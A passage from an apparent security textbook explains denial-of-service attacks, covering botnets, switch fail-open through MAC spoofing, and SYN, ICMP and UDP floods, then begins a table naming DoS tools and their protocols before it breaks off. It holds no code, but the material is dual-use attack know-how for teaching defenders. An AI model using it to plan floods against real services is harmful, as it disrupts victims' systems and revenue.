<div class="Section216" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >While DoS attacks don&#8217;t require finesse, the attacker still needs significant resources. Years ago, bandwidth was measured by megabytes or even kilobytes. Back then, a single script kiddie needed a reasonably good connection and his tool to launch a DoS that could disrupt a small to medium business.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:12.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Today, it&#8217;s more accurate to say someone launching a DoS would be launching a distributed denial-of-service (DDoS) attack, relying on a network of compromised systems. Given a botnet, even large corporate connections capable of handling several gigabits per second are easily interrupted. To make matters worse, hiring or borrowing someone else&#8217;s botnet is possible with money saved from a few pizza orders. So, yes, the same script kiddie can still disrupt a small to medium business easily and cheaply. Larger, more resilient corporate connections are more difficult, but as the media shows, it&#8217;s very possible.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:7.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It&#8217;s beyond this book&#8217;s scope to explain the rationale why DoS attacks happen. Maybe it&#8217;s enough to say attacks are driven by fame or money. Whether done for glory, revenge, or for a competitor, DoS attacks end with a company suffering loss of revenue and reputation. Let&#8217;s dive into technical reasons why DoS attacks work.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >DoS attacks might not deny service entirely, but might only deny the service </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >securely</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Consider a device or software that normally uses a secure connection or has options for communicating securely.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Sometimes when a device experiences issues operating, it might downgrade those options in order to keep operating.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With a little reconnaissance, the attackers know what device they are up against. When a device or software is interrupted and can no longer deliver reliably, the device or application might opt to degrade a secure method for a more open, more vulnerable method. Running more vulnerably is better than not delivering at all, right?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:13.3500pt;" ><a name="_bookmark426" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For example, as mentioned in </span><span><a href="#_bookmark237" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the network switches forward traffic only out the port leading to the target device. Traffic in one port and out one port maintains some level of confidentiality, among other benefits. This traffic control is possible because the switch manages a table associating MAC addresses seen per port. But</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section217" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >what happens if the switch is denied that service? A type of DoS attack on a switch, called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >MAC spoofing</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, can force the switch to &#8220;fail open,&#8221; resulting in traffic exiting out all ports. From the perspective of the switch engineer, at least its traffic will continue, even if with degraded performance. However, from a security perspective, all traffic is visible across all ports. In short, a switch that is failed open is a hub.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Who benefits? The person seeking to sniff all traffic out of that switch turned hub. The result of a switch failing open is that essentially every port is a mirrored port. That secondary attack might be achievable only after a device fails open. Once that&#8217;s done, a secondary, more targeted attack can be carried out. For example, once the network switch fails open to act as a hub, all traffic can be sniffed, rather than just a fraction of it, helping to map out the network or locate the correct target.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The bottom line is, once security (confidentiality, integrity and/or availability) can be interrupted, the attacker reaches his or her goal, or at least is much closer to reaching it. DoS attacks aren&#8217;t commonly used as stepping stones to another attack. That&#8217;s because they&#8217;re so noisy in the first place. But if devices aren&#8217;t closely monitoring, the quieter method of interrupting security may be all it takes to move forward onto the next exploit.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >How DoS Attacks Get Done</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >DoS attacks happens in one of two ways:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;line-height:145%;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker280170.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:65.0833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker280171.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Bury the target in traffic to the point of exhausting its resources. Send traffic that is crafted or malformed so the target fails.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The first is the &#8220;drinking from a fire hose&#8221; method. This is carried out by brute force. The attacker, plus a million other devices he or she controls, sends a connection request to the target. The target server is quickly overwhelmed and fails under the workload.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The second method is subtler and should require more working knowledge of the target&#8212;for example, that the target system runs a homegrown application listening only for a specific protocol or for connections from a known IP address. Another challenge is that the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section218" ><p class=MsoBodyText  style="margin-top:3.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packets crafted to trip up that application might need additional testing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-right:11.1500pt;" ><a name="_bookmark427" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In either case, the end result the attacker wants is to deny service. If that service is public facing, then it&#8217;s easy enough to verify success once the attack is on.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Drinking from a Fire Hose</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Let&#8217;s dive into the first method&#8212;overwhelming the target. Sending tons of packets works well, but what protocol do you use? The answer is, whatever protocol will be heard, processed at least a little and not ignored. The target server very likely processes TCP/IP like every other system, so there are a slew of protocols the target will be listening for.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >And the analogy &#8220;drinking from a fire hose&#8221; sticks well, because most DoS attacks using these protocols have names like SYN flood, ICMP flood, and UDP flood. It&#8217;s a flood of traffic, and the destination can&#8217;t keep its interface above water. (Okay, too far; we&#8217;ll stop the analogy talk.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Let&#8217;s cover some protocols used to flood the target. The SYN flood works well because the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SYN </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packet is the start of the three-way handshake to initiate a TCP connection. In this case, the target gets a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SYN </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packet from anywhere (spoofing works well here). The target responds as expected with </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SYN-ACK </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and gets no </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ACK </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >reply. The handshake is never completed, occupying a miniscule amount of network resources to wait patiently. After a few million handshake attempts, the target&#8217;s resources are exhausted. The source IP address can be spoofed because the attacker doesn&#8217;t care if the connection completes. By randomizing the source IP, blacklisting a range of IPs at an upstream router does not mitigate the problem.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:6.9500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The process is basically the same for ICMP and UDP floods. In an ICMP flood attack, the attacker overwhelms the target with ping requests or Type 8 ICMP packets. While seasoned security professionals might disregard ICMP flood attacks as obsolete from the 1990s, a DoS attack by ICMP flood found new life in late 2016 from Type 3 &#8220;Destination Unreachable&#8221; responses. In the case of a UDP</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section219" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:12.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flood, the attack is essentially similar to using ICMP ping requests. The target system is overwhelmed with UDP packets to various ports. The UDP packets likely originate from several, spoofed senders, to multiply the effect. For every UDP packet, the target will respond with an ICMP Type 3 Destination Unreachable response, draining more and more resources.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In recent years, across the many tools available, the most common protocol employed is HTTP. Naturally, the targeted server and/or open ports would determine the chosen protocol. But HTTP is by far the most shared or single protocol used to get the job done.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><a name="_bookmark428" ></a><span><a href="#_bookmark430" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 5-2</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >compiles a list of the most well-known DoS tools and shows their respective attack protocol of choice.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:10.5500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark430" ></a><span><a href="#_bookmark428" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 5-2:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Well-Known DoS Tools</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><table class=MsoNormalTable  border=1  cellspacing=0  style="border-collapse:collapse;width:467.2500pt;margin-left:14.4000pt;mso-table-layout-alt:fixed;border:none;mso-border-left-alt:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);mso-border-insideh:1.0000pt solid rgb(191,191,191);mso-border-insidev:1.0000pt solid rgb(191,191,191);mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >NAME</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >VERSION</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >ATTACKS</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Anonymous DoSer</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >2.0</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >AnonymousDOS</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >0</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >BanglaDOS</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >0</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >HTTP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >ByteDOS</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >3.2</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=396  valign=top  style="width:237.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >SYN, ICMP</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=247  valign=top  style="width:148.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >DoS</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=135  valign=top  style="width:81.0000pt;padding:0.0000pt 0.0000pt 